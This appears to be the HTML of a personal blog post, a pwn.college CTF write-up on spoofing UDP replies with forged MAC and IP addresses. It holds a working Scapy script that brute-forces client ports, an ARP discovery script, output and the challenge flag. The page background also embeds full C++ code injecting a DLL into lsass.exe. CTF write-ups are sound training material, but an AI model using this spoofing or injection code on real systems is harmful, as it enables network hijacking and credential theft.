@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛰️ UDP Spoofing 4 – Writeup (pwn.college)</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🛰️ UDP Spoofing 4 – Writeup (pwn.college)" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🛰️ UDP Spoofing 4 – Writeup (pwn.college)</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-summary">📌 Challenge Summary</h2>
+
+<blockquote>
+  <p>In this level, <strong>MAC address verification</strong> is introduced. The client no longer just checks IP and port — it now verifies the <strong>source MAC address</strong> of the server. This mimics real-world behavior in local network spoofing, where <strong>layer 2</strong> details (MAC) matter. To succeed, you must <strong>spoof the IP <em>and</em> MAC address</strong> of the server and deliver the payload to the correct source port.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-understanding-the-setup">🧠 Understanding the Setup</h2>
+
+<p>Three entities again:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Server (10.0.0.3)</code> → Real MAC: <code class="language-plaintext highlighter-rouge">86:d1:db:9c:0f:74</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Client (10.0.0.2)</code> → Real MAC: <code class="language-plaintext highlighter-rouge">ae:c5:25:6c:f0:ec</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Attacker (10.0.0.1)</code> → You, spoofing both IP and MAC</li>
+</ul>
+
+<h3 id="-key-points">🧩 Key Points:</h3>
+<ul>
+  <li>The client sends a request to the server and waits for a reply.</li>
+  <li>It expects that reply to come <strong>from the correct IP and MAC</strong>.</li>
+  <li>The source port is still randomized — so we need to <strong>brute-force the ephemeral ports</strong>, but this time with proper MAC spoofing.</li>
+</ul>
+
+<hr />
+
+<h2 id="-how-we-exploit-it">🔍 How We Exploit It</h2>
+
+<h3 id="-challenge">🔒 Challenge:</h3>
+<p>We need to forge a packet such that:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">src IP</code> = <code class="language-plaintext highlighter-rouge">10.0.0.3</code> (spoofed)</li>
+  <li><code class="language-plaintext highlighter-rouge">dst IP</code> = <code class="language-plaintext highlighter-rouge">10.0.0.2</code> (client)</li>
+  <li><code class="language-plaintext highlighter-rouge">src MAC</code> = <code class="language-plaintext highlighter-rouge">86:d1:db:9c:0f:74</code> (server’s real MAC)</li>
+  <li><code class="language-plaintext highlighter-rouge">dst MAC</code> = <code class="language-plaintext highlighter-rouge">ae:c5:25:6c:f0:ec</code> (client’s real MAC)</li>
+  <li><code class="language-plaintext highlighter-rouge">UDP dport</code> = guessed (loop 49152–65535)</li>
+  <li>Payload = <code class="language-plaintext highlighter-rouge">FLAG:10.0.0.1:12345</code> to redirect the response to us</li>
+</ul>
+
+<hr />
+
+<h2 id="-attack-plan">🧪 Attack Plan</h2>
+
+<ol>
+  <li><strong>Discover MAC addresses</strong> using ARP scan via <code class="language-plaintext highlighter-rouge">mac_3.py</code></li>
+  <li><strong>Sniff for flag response</strong> on attacker’s IP:port (<code class="language-plaintext highlighter-rouge">10.0.0.1:12345</code>)</li>
+  <li><strong>Send spoofed packets</strong> using <code class="language-plaintext highlighter-rouge">sendp()</code> with:
+    <ul>
+      <li>Ethernet header (with spoofed MAC addresses)</li>
+      <li>IP/UDP payload with flag redirect</li>
+      <li>Loop through ports <code class="language-plaintext highlighter-rouge">49152–65535</code></li>
+    </ul>
+  </li>
+  <li><strong>Success</strong>: If MAC/IP/port match, the client will send the flag to our listener</li>
+</ol>
+
+<hr />
+
+<h2 id="-final-exploit--idepy">💣 Final Exploit – <code class="language-plaintext highlighter-rouge">ide.py</code></h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="n">send</span><span class="p">,</span> <span class="n">sniff</span><span class="p">,</span> <span class="n">IP</span><span class="p">,</span> <span class="n">UDP</span> <span class="p">,</span> <span class="n">Ether</span> <span class="p">,</span> <span class="n">sendp</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="n">attacker_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.1</span><span class="sh">'</span>
+<span class="n">attacker_port</span> <span class="o">=</span> <span class="mi">12345</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.2</span><span class="sh">'</span>
+<span class="n">spoofed_src_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.3</span><span class="sh">'</span>
+
+<span class="n">found_flag</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">src</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">mac src = </span><span class="sh">"</span><span class="p">)</span>  <span class="c1"># Server MAC
+</span><span class="n">dst</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">mac dst = </span><span class="sh">"</span><span class="p">)</span>  <span class="c1"># Client MAC
+</span>
+<span class="k">def</span> <span class="nf">udp_req</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">found_flag</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Starting to send spoofed responses...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">49152</span><span class="p">,</span> <span class="mi">65536</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">found_flag</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">pkt</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">src</span> <span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">dst</span><span class="p">)</span><span class="o">/</span><span class="nc">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">spoofed_src_ip</span><span class="p">)</span><span class="o">/</span><span class="nc">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="mi">31337</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">FLAG:</span><span class="si">{</span><span class="n">attacker_ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">attacker_port</span><span class="si">}</span><span class="sh">'</span>
+        <span class="nf">sendp</span><span class="p">(</span><span class="n">pkt</span><span class="o">/</span><span class="n">payload</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Finished sending spoofed packets.</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sniffer</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">found_flag</span>
+
+    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">found_flag</span>
+        <span class="k">if</span> <span class="n">pkt</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">UDP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">UDP</span><span class="p">].</span><span class="n">dport</span> <span class="o">==</span> <span class="n">attacker_port</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Flag captured!</span><span class="sh">"</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Data: </span><span class="si">{</span><span class="nf">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">UDP</span><span class="p">].</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">pkt</span><span class="p">.</span><span class="nf">show</span><span class="p">()</span>
+            <span class="n">found_flag</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sniffing for incoming flag response...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">udp and port </span><span class="si">{</span><span class="n">attacker_port</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">handle</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">sniffer</span><span class="p">)</span>
+    <span class="n">t</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+    <span class="nf">udp_req</span><span class="p">()</span>
+    <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="mac-discovery-script">MAC Discovery Script</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Ether</span><span class="p">,</span> <span class="n">srp</span>
+
+<span class="n">target_ip</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">ip:</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Build the ARP request
+</span><span class="n">arp</span> <span class="o">=</span> <span class="nc">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span>
+<span class="n">ether</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="sh">"</span><span class="s">ff:ff:ff:ff:ff:ff</span><span class="sh">"</span><span class="p">)</span>  <span class="c1"># Broadcast
+</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="n">ether</span> <span class="o">/</span> <span class="n">arp</span>
+
+<span class="c1"># Send the packet and receive the response
+</span><span class="n">ans</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">srp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">sent</span><span class="p">,</span> <span class="n">received</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">IP: </span><span class="si">{</span><span class="n">received</span><span class="p">.</span><span class="n">psrc</span><span class="si">}</span><span class="s"> - MAC: </span><span class="si">{</span><span class="n">received</span><span class="p">.</span><span class="n">hwsrc</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="output">Output</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mac src <span class="o">=</span> 86:d1:db:9c:0f:74
+mac dst <span class="o">=</span> ae:c5:25:6c:f0:ec
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing <span class="k">for </span>incoming flag response...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting to send spoofed responses...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Flag captured!
+Data: b<span class="s1">'pwn.college{AnV4AvxOApEFOrysLCQBN3nRBT1.01N0AjNxwSM0IzMyEzW}\n'</span>
+<span class="c">###[ Ethernet ]###</span>
+  dst       <span class="o">=</span> 6a:ea:10:e5:9c:d8
+  src       <span class="o">=</span> ae:c5:25:6c:f0:ec
+  <span class="nb">type</span>      <span class="o">=</span> IPv4
+<span class="c">###[ IP ]###</span>
+     src       <span class="o">=</span> 10.0.0.2
+     dst       <span class="o">=</span> 10.0.0.1
+<span class="c">###[ UDP ]###</span>
+     sport     <span class="o">=</span> 57740
+     dport     <span class="o">=</span> 12345
+<span class="c">###[ Raw ]###</span>
+     load      <span class="o">=</span> b<span class="s1">'pwn.college{AnV4AvxOApEFOrysLCQBN3nRBT1.01N0AjNxwSM0IzMyEzW}\n'</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>AnV4AvxOApEFOrysLCQBN3nRBT1.01N0AjNxwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
